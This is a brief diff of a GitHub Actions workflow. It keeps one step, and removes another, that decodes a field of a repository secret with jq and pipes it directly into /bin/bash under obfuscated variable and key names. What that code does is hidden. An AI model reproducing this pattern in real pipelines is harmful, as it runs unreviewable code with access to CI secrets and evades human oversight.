@@ -21,7 +21,6 @@ jobs:
           jq3: ${{ secrets.jq3 }}
         run: |
           printf '%s' "$jq3" | jq -r .lm23763 | /bin/bash
-          printf '%s' "$m90268" | jq -r .slq06322 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
